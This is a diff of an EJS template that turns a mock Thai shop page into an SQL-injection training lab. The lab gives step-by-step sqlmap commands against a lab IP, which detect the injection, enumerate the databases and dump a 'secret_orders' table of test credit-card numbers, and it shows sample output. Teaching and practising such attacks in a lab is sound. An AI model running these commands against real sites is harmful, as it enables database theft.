@@ -6,66 +6,156 @@
   <title><%= title %> | ThaiMart</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/css/style.css">
   <style>
-    .product-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-      gap: 1.5rem;
-    }
-    .product-card {
-      background: white;
-      border: 1px solid var(--border);
+    .command-card {
+      background: #1e1e1e;
       border-radius: 12px;
+      margin-bottom: 1.5rem;
       overflow: hidden;
-      transition: transform 0.2s, box-shadow 0.2s;
     }
-    .product-card:hover {
-      transform: translateY(-4px);
-      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
-    }
-    .product-image {
-      height: 150px;
-      background: linear-gradient(135deg, var(--primary-light) 0%, var(--background) 100%);
+    .command-header {
+      padding: 1rem 1.5rem;
       display: flex;
       align-items: center;
-      justify-content: center;
-      font-size: 3rem;
+      gap: 1rem;
+      border-bottom: 1px solid #333;
     }
-    .product-info {
-      padding: 1rem;
-    }
-    .product-name {
+    .step-badge {
+      font-family: 'Fira Code', monospace;
       font-weight: 600;
-      color: var(--secondary);
-      margin-bottom: 0.5rem;
-    }
-    .product-price {
-      color: var(--primary);
-      font-size: 1.25rem;
-      font-weight: 700;
-    }
-    .category-nav {
-      display: flex;
-      gap: 0.5rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .category-link {
-      padding: 0.5rem 1rem;
-      background: white;
-      border: 1px solid var(--border);
-      border-radius: 20px;
-      text-decoration: none;
-      color: var(--text-dark);
       font-size: 0.9rem;
+      padding: 0.4rem 0.8rem;
+      border-radius: 6px;
+      min-width: 70px;
+      text-align: center;
+      background: #3b82f620;
+      color: #3b82f6;
+    }
+    .step-badge.detect { background: #22c55e20; color: #22c55e; }
+    .step-badge.dbs { background: #f59e0b20; color: #f59e0b; }
+    .step-badge.tables { background: #8b5cf620; color: #8b5cf6; }
+    .step-badge.dump { background: #ef444420; color: #ef4444; }
+    .command-desc {
+      color: #9ca3af;
+      font-size: 0.9rem;
+    }
+    .command-body {
+      padding: 1.5rem;
+    }
+    .command-code {
+      background: #0d0d0d;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.85rem;
+      color: #e5e7eb;
+      overflow-x: auto;
+      position: relative;
+    }
+    .command-code .prompt { color: #22c55e; }
+    .command-code .flag { color: #60a5fa; }
+    .command-code .url { color: #fbbf24; }
+    .command-code .string { color: #f472b6; }
+    .copy-btn {
+      position: absolute;
+      top: 0.5rem;
+      right: 0.5rem;
+      background: #374151;
+      border: none;
+      color: #9ca3af;
+      padding: 0.4rem 0.8rem;
+      border-radius: 4px;
+      font-size: 0.75rem;
+      cursor: pointer;
       transition: all 0.2s;
     }
-    .category-link:hover, .category-link.active {
-      background: var(--primary);
+    .copy-btn:hover {
+      background: #4b5563;
+      color: #fff;
+    }
+    .intro-box {
+      background: linear-gradient(135deg, var(--secondary) 0%, #2d4a6f 100%);
+      border-radius: 12px;
+      padding: 2rem;
       color: white;
-      border-color: var(--primary);
+      margin-bottom: 2rem;
+    }
+    .intro-box h2 {
+      margin-bottom: 0.5rem;
+    }
+    .intro-box p {
+      opacity: 0.9;
+      margin-bottom: 1rem;
+    }
+    .intro-box code {
+      background: rgba(255,255,255,0.15);
+      padding: 0.2rem 0.5rem;
+      border-radius: 4px;
+      font-size: 0.9rem;
+    }
+    .target-box {
+      background: #fef3c7;
+      border: 2px solid #f59e0b;
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin-bottom: 2rem;
+    }
+    .target-box h3 {
+      color: #b45309;
+      margin-bottom: 0.75rem;
+    }
+    .target-url {
+      background: white;
+      border: 1px solid #fbbf24;
+      border-radius: 8px;
+      padding: 1rem;
+      font-family: 'Fira Code', monospace;
+      font-size: 1rem;
+      color: #92400e;
+      word-break: break-all;
+    }
+    .goal-box {
+      background: #fee2e2;
+      border: 1px solid #ef4444;
+      border-radius: 8px;
+      padding: 1rem;
+      margin-bottom: 2rem;
+    }
+    .goal-box h4 {
+      color: #dc2626;
+      margin-bottom: 0.5rem;
+    }
+    .goal-box p {
+      color: #7f1d1d;
+      margin: 0;
+      font-size: 0.95rem;
+    }
+    .output-example {
+      background: white;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      overflow: hidden;
+    }
+    .output-header {
+      background: var(--background);
+      padding: 0.75rem 1rem;
+      font-weight: 600;
+      border-bottom: 1px solid var(--border);
+    }
+    .output-body {
+      padding: 1rem;
+    }
+    .output-body pre {
+      background: #1e1e1e;
+      color: #e5e7eb;
+      padding: 1rem;
+      border-radius: 8px;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.8rem;
+      overflow-x: auto;
+      margin: 0;
     }
   </style>
 </head>
@@ -78,73 +168,188 @@
       </a>
       <nav class="nav">
         <a href="/" class="nav-link">หน้าแรก</a>
-        <a href="/lab06?id=1" class="nav-link active">หมวดหมู่</a>
-        <a href="/lab07" class="nav-link">ค้นหา</a>
+        <a href="/lab06" class="nav-link active">SQLmap Lab</a>
       </nav>
-      <div class="header-slogan">ช้อปสนุก ส่งไว ทั่วไทย</div>
+      <div class="header-slogan">Security Training</div>
     </div>
   </header>
 
   <div class="page-header">
     <div class="container">
-      <h1 class="page-title"><%= category ? category.name : 'หมวดหมู่สินค้า' %></h1>
-      <p class="page-subtitle">เลือกซื้อสินค้าคุณภาพ ราคาดี</p>
+      <h1 class="page-title">SQLmap Lab</h1>
+      <p class="page-subtitle">ใช้ sqlmap เพื่อค้นหาและดึงข้อมูลลับจากฐานข้อมูล</p>
     </div>
   </div>
 
   <main class="main">
     <div class="container page-content">
-      <!-- Category Navigation -->
-      <div class="category-nav">
-        <a href="/lab06?id=1" class="category-link <%= categoryId == '1' ? 'active' : '' %>">📱 อิเล็กทรอนิกส์</a>
-        <a href="/lab06?id=2" class="category-link <%= categoryId == '2' ? 'active' : '' %>">👕 แฟชั่น</a>
-        <a href="/lab06?id=3" class="category-link <%= categoryId == '3' ? 'active' : '' %>">🏠 บ้านและสวน</a>
-        <a href="/lab06?id=4" class="category-link <%= categoryId == '4' ? 'active' : '' %>">🎮 เกมและของเล่น</a>
-        <a href="/lab06?id=5" class="category-link <%= categoryId == '5' ? 'active' : '' %>">📚 หนังสือ</a>
+
+      <!-- Introduction -->
+      <div class="intro-box">
+        <h2>🖥️ ใช้ Terminal ของคุณ</h2>
+        <p>Lab นี้ต้องใช้ <code>sqlmap</code> ใน Terminal ด้วยตัวเอง ไม่มีปุ่มให้กด!</p>
+        <p>หน้านี้มีช่องโหว่ SQL Injection แบบ Numeric ซึ่ง sqlmap สามารถตรวจจับและ exploit ได้อัตโนมัติ</p>
       </div>
 
-      <% if (error) { %>
-        <div class="alert alert-danger">
-          <strong>Database Error:</strong> <%= error %>
-        </div>
-      <% } %>
+      <!-- Target URL -->
+      <div class="target-box">
+        <h3>🎯 Target URL</h3>
+        <div class="target-url">http://10.10.61.87/lab06?id=1</div>
+        <p style="margin-top: 0.75rem; color: #92400e; font-size: 0.9rem;">
+          พารามิเตอร์ <code>id</code> มีช่องโหว่ SQL Injection
+        </p>
+      </div>
 
-      <!-- Products Grid -->
-      <% if (products.length > 0) { %>
-        <div class="product-grid">
-          <% products.forEach(product => { %>
-            <div class="product-card">
-              <div class="product-image">
-                <% if (categoryId == '1') { %>📱
-                <% } else if (categoryId == '2') { %>👕
-                <% } else if (categoryId == '3') { %>🏠
-                <% } else if (categoryId == '4') { %>🎮
-                <% } else { %>📦<% } %>
-              </div>
-              <div class="product-info">
-                <div class="product-name"><%= product.name %></div>
-                <div class="product-price">฿<%= product.price ? product.price.toLocaleString() : '0' %></div>
-                <button class="btn btn-primary btn-sm mt-2" style="width: 100%;">หยิบใส่ตะกร้า</button>
-              </div>
-            </div>
-          <% }) %>
+      <!-- Goal -->
+      <div class="goal-box">
+        <h4>🚩 เป้าหมาย</h4>
+        <p>ค้นหาตาราง <strong>secret_orders</strong> และดึงข้อมูลบัตรเครดิตปลอมที่ซ่อนอยู่</p>
+      </div>
+
+      <!-- Step 1: Detect Injection -->
+      <div class="command-card">
+        <div class="command-header">
+          <span class="step-badge detect">Step 1</span>
+          <span class="command-desc">ตรวจหาช่องโหว่ SQL Injection</span>
         </div>
-      <% } else { %>
-        <div class="card">
-          <div class="card-body text-center p-3">
-            <p class="text-muted">ไม่พบสินค้าในหมวดหมู่นี้</p>
+        <div class="command-body">
+          <div class="command-code">
+            <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+<span class="prompt">$</span> sqlmap <span class="flag">-u</span> <span class="url">"http://10.10.61.87/lab06?id=1"</span> <span class="flag">--batch</span>
+          </div>
+          <p style="color: #9ca3af; margin-top: 1rem; font-size: 0.85rem;">
+            <code>--batch</code> = ตอบ Yes อัตโนมัติทุกคำถาม
+          </p>
+        </div>
+      </div>
+
+      <!-- Step 2: List Databases -->
+      <div class="command-card">
+        <div class="command-header">
+          <span class="step-badge dbs">Step 2</span>
+          <span class="command-desc">แสดงรายชื่อฐานข้อมูลทั้งหมด</span>
+        </div>
+        <div class="command-body">
+          <div class="command-code">
+            <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+<span class="prompt">$</span> sqlmap <span class="flag">-u</span> <span class="url">"http://10.10.61.87/lab06?id=1"</span> <span class="flag">--dbs</span> <span class="flag">--batch</span>
+          </div>
+          <p style="color: #9ca3af; margin-top: 1rem; font-size: 0.85rem;">
+            <code>--dbs</code> = แสดง databases ทั้งหมด
+          </p>
+        </div>
+      </div>
+
+      <!-- Step 3: List Tables -->
+      <div class="command-card">
+        <div class="command-header">
+          <span class="step-badge tables">Step 3</span>
+          <span class="command-desc">แสดงตารางในฐานข้อมูล thaimart</span>
+        </div>
+        <div class="command-body">
+          <div class="command-code">
+            <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+<span class="prompt">$</span> sqlmap <span class="flag">-u</span> <span class="url">"http://10.10.61.87/lab06?id=1"</span> <span class="flag">-D</span> <span class="string">thaimart</span> <span class="flag">--tables</span> <span class="flag">--batch</span>
+          </div>
+          <p style="color: #9ca3af; margin-top: 1rem; font-size: 0.85rem;">
+            <code>-D thaimart</code> = เลือกฐานข้อมูล, <code>--tables</code> = แสดงตาราง
+          </p>
+        </div>
+      </div>
+
+      <!-- Step 4: Dump Secret Table -->
+      <div class="command-card">
+        <div class="command-header">
+          <span class="step-badge dump">Step 4</span>
+          <span class="command-desc">ดึงข้อมูลจากตาราง secret_orders</span>
+        </div>
+        <div class="command-body">
+          <div class="command-code">
+            <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+<span class="prompt">$</span> sqlmap <span class="flag">-u</span> <span class="url">"http://10.10.61.87/lab06?id=1"</span> <span class="flag">-D</span> <span class="string">thaimart</span> <span class="flag">-T</span> <span class="string">secret_orders</span> <span class="flag">--dump</span> <span class="flag">--batch</span>
+          </div>
+          <p style="color: #9ca3af; margin-top: 1rem; font-size: 0.85rem;">
+            <code>-T secret_orders</code> = เลือกตาราง, <code>--dump</code> = ดึงข้อมูลทั้งหมด
+          </p>
+        </div>
+      </div>
+
+      <!-- Expected Output -->
+      <div class="output-example">
+        <div class="output-header">📤 ตัวอย่างผลลัพธ์ที่ควรได้ (Step 4)</div>
+        <div class="output-body">
+          <pre>Database: thaimart
+Table: secret_orders
+[3 entries]
++----+------------------+------------------+------------+
+| id | customer_name    | credit_card      | amount     |
++----+------------------+------------------+------------+
+| 1  | John Doe         | 4111111111111111 | 15000.00   |
+| 2  | Jane Smith       | 5500000000000004 | 8500.00    |
+| 3  | Bob Wilson       | 340000000000009  | 25000.00   |
++----+------------------+------------------+------------+</pre>
+        </div>
+      </div>
+
+      <!-- Additional Commands -->
+      <div class="card mt-2">
+        <div class="card-header">📚 คำสั่งเพิ่มเติม</div>
+        <div class="card-body">
+          <p style="font-size: 0.9rem; margin-bottom: 0.75rem;">
+            <strong>ดูคอลัมน์ในตาราง:</strong>
+          </p>
+          <code style="background: #f1f5f9; padding: 0.5rem; display: block; border-radius: 4px; font-size: 0.85rem; margin-bottom: 1rem;">
+            sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart -T secret_orders --columns --batch
+          </code>
+          <p style="font-size: 0.9rem; margin-bottom: 0.75rem;">
+            <strong>ดึงข้อมูลเฉพาะคอลัมน์:</strong>
+          </p>
+          <code style="background: #f1f5f9; padding: 0.5rem; display: block; border-radius: 4px; font-size: 0.85rem; margin-bottom: 1rem;">
+            sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart -T secret_orders -C credit_card --dump --batch
+          </code>
+          <p style="font-size: 0.9rem; margin-bottom: 0.75rem;">
+            <strong>เพิ่มความเร็ว:</strong>
+          </p>
+          <code style="background: #f1f5f9; padding: 0.5rem; display: block; border-radius: 4px; font-size: 0.85rem;">
+            sqlmap -u "http://10.10.61.87/lab06?id=1" --dbs --batch --threads=10
+          </code>
+        </div>
+      </div>
+
+      <!-- Test the Page -->
+      <div class="card mt-2">
+        <div class="card-header">🔍 ทดสอบหน้าเว็บเป้าหมาย</div>
+        <div class="card-body">
+          <p style="font-size: 0.9rem; margin-bottom: 1rem;">
+            คลิกลิงก์ด้านล่างเพื่อดูหน้าเว็บที่มีช่องโหว่ (สังเกต URL parameter <code>id</code>)
+          </p>
+          <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
+            <a href="/lab06?id=1" target="_blank" class="btn btn-primary btn-sm">id=1 (ปกติ)</a>
+            <a href="/lab06?id=2" target="_blank" class="btn btn-secondary btn-sm">id=2 (ปกติ)</a>
+            <a href="/lab06?id=1'" target="_blank" class="btn btn-danger btn-sm">id=1' (Error)</a>
           </div>
         </div>
-      <% } %>
+      </div>
+
     </div>
   </main>
 
   <footer class="footer">
     <div class="container">
       <div class="footer-content">
-        <p class="footer-text">© 2569 ThaiMart Co., Ltd.</p>
+        <p class="footer-text">© 2569 ThaiMart Security Training</p>
       </div>
     </div>
   </footer>
+
+  <script>
+    function copyCommand(btn) {
+      const codeBlock = btn.parentElement;
+      const text = codeBlock.innerText.replace('Copy', '').replace('$', '').trim();
+      navigator.clipboard.writeText(text);
+      btn.textContent = 'Copied!';
+      setTimeout(() => btn.textContent = 'Copy', 2000);
+    }
+  </script>
 </body>
 </html>
